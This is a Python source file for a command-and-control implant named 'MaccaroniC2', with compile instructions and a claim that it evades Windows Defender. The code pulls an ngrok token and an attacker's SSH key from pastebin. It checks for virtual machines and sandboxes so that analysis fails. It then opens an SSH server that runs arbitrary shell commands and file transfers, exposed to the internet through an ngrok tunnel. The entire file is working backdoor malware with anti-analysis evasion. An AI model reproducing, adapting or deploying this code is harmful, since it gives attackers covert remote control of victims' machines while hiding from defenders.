# MaccaroniC2 Custom Server
# Compile with Nuitka: python -m nuitka --standalone --onefile weaponized_server.py
# Windows Defender Bypassed last check - 19.00, 24 May 2023 - All settings enabled

import asyncio
import asyncssh
import sys
import subprocess
import requests
import win32api
import cpuinfo
import socket
import hashlib
import base64

from pyngrok import ngrok
from cryptography.fernet import Fernet


def generate_key_from_password(password):
    """Generate key from password for Fernet algo"""

    try:
        # Convert the password to bytes and take the SHA256 hash
        password_hash = hashlib.sha256(password.encode()).digest()

        # Use the first 32 bytes of the password hash as the key
        key = base64.urlsafe_b64encode(password_hash[:32])

        return key
    except:
        exit('[-] Error: Could not generate key from password')


def fernet_decrypt(encrypted_string, password):
    """Decrypt Ngrok AUTH Token"""

    try:
        key = generate_key_from_password(password)
        cipher = Fernet(key)
        decrypted_message = cipher.decrypt(encrypted_string)

        return decrypted_message.decode()
    except:
        exit('[-] Error: Could not decrypt AUTH Token')

def get_auth_token():
    """Get AUTH Token from third party service"""

    try:        
        url = "https://pastebin.com/raw/XXXXXXXX"
        r = requests.get(url)

        if r.status_code == 200:
            password_for_decrypt = 'Passw0rd!'
            crypted_data = r.text.strip('\n')
            
            return fernet_decrypt(crypted_data, password_for_decrypt)

        elif r.status_code == 404:
            # Here we could insert a request to a canary token to be notified of the event if the file is not found
            # - for persistence purpose -
            exit() # So Long, and Thanks for All the Fish!
    except:
        exit('[-] Error: Could not get AUTH Token')


def get_pub_key():
    """Get SSH pub key from third party service"""

    try:
        global PRIVATE_KEY
        global AUTHORIZED_KEY
        
        url = "https://pastebin.com/raw/XXXXXX"
        r = requests.get(url)

        if r.status_code == 200:
            pub_key = r.text.strip('\n')
        elif r.status_code == 404:
            exit() # So Long, and Thanks for All the Fish!
    except:
        exit('[-] Error: Could not get SSH pub key')


    AUTHORIZED_KEY = asyncssh.import_authorized_keys(pub_key)

    # Generate a new ssh rsa key every time the script starts
    server_key = asyncssh.generate_private_key('ssh-rsa')
    PRIVATE_KEY = server_key.export_private_key('openssh')


def detect_sandbox():
    """Detect if running in a virtual / sandbox environment with most common techniques"""

    # Technique 1: Check for common sandbox-related processes
    sandbox_processes = ["vmsrvc.exe",
                         "vmusrvc.exe",
                         "vboxservice.exe",
                         "vboxtray.exe",
                         "vmtoolsd.exe",
                         "vmacthlp.exe",
                         "vmtools.exe",
                         "df5serv.exe"]
    running_processes = subprocess.check_output("tasklist", shell=True).decode().lower()

    for process in sandbox_processes:
        if process in running_processes:
            return True


    # Technique 2: Check for the presence of known MAC addresses associated with virtualization
    known_mac_addresses = ["00:05:69",
                           "00:1C:14",
                           "00:0C:29",
                           "00:50:56",
                           "08:00:27",
                           "0A:00:27",
                           "00:16:3E",
                           "0C:29:AB",
                           "00:0C:29",
                           "00:1C:42"]
    interfaces = subprocess.check_output("ipconfig /all", shell=True).decode().split("\n\n")

    for interface in interfaces:
        if any(mac_address in interface for mac_address in known_mac_addresses):
            return True

    # Technique 3: Check if running in a sandboxed network environment
    sandboxed_networks = ["10.0.2.", "192.168.44.", "172.16.0.", "172.16.1.", "172.16.2.", "172.16.3.",
                          "172.16.4.", "172.16.5.", "172.16.6.", "172.16.7.", "172.16.8.", "172.16.9.",
                          "172.16.10.", "172.16.11.", "172.16.12.", "172.16.13.", "172.16.14.", "172.16.15."]
    local_ip = socket.gethostbyname(socket.gethostname())

    for network in sandboxed_networks:
        if local_ip.startswith(network):
            return True
        
    # Technique 4: Check for virtualized CPU features
    cpu_info = cpuinfo.get_cpu_info()
    virtualized_cpu_features = ["hypervisor", "vmx", "svm", "vmm", "nx"]
    if any(feature in cpu_info["flags"] for feature in virtualized_cpu_features):
        return True        

    # Technique 5: Check if disk size is greater than 50 GB
    min_disk_size_gb = 50

    if len(sys.argv) > 1:
        min_disk_size_gb = float(sys.argv[1])

    _, disk_size_bytes, _ = win32api.GetDiskFreeSpaceEx()

    disk_size_gb = disk_size_bytes / 1073741824

    if disk_size_gb > min_disk_size_gb:
        return False # Proceed
    else:
        return True # Not Proceed


def ngrok_tunnel():
    """Start ngrok tunnel"""

    global TUNNELS

    ngrok.set_auth_token(get_auth_token())
    ssh_tunnel = ngrok.connect(8022, "tcp")
    TUNNELS = ngrok.get_tunnels()


async def handle_client(process: asyncssh.SSHServerProcess) -> None:
    process.stdout.write(f'\n{TUNNELS}\n')
    process.stdout.write(f'[+] Executing command: {process.command}\n')
    
    # Execute process.command in a subprocess and capture the output
    try:
        output = subprocess.check_output(process.command, shell=True, stderr=subprocess.STDOUT)
        process.stdout.write(f'[+] Command executed successfully!\n\n{output.decode()}\n')
    except subprocess.CalledProcessError as e:
        process.stdout.write(f'[FAIL] Command returned non-zero exit status: {e.returncode}\n')
        process.stdout.write(f'[+] Error output: {e.output.decode()}\n')
    
    await process.stdout.drain()  # Ensure output is sent to the client
    process.exit(0)



async def start_server() -> None:
    await asyncssh.listen('127.0.0.1',
                          8022,
                          server_host_keys=PRIVATE_KEY,
                          authorized_client_keys=AUTHORIZED_KEY,
                          sftp_factory=True,
                          allow_scp=True,
                          process_factory=handle_client)

loop = asyncio.get_event_loop()

try:
    # Sandbox detection
    exit() if detect_sandbox() else None # STACCA STACCA !
    # Get SSH public key from pastebin
    get_pub_key()
    # Start the server
    loop.run_until_complete(start_server())
    # Start the ngrok tunnel
    ngrok_tunnel()
except (OSError, asyncssh.Error) as exc:
    sys.exit('[+] Error: ' + str(exc))

loop.run_forever()
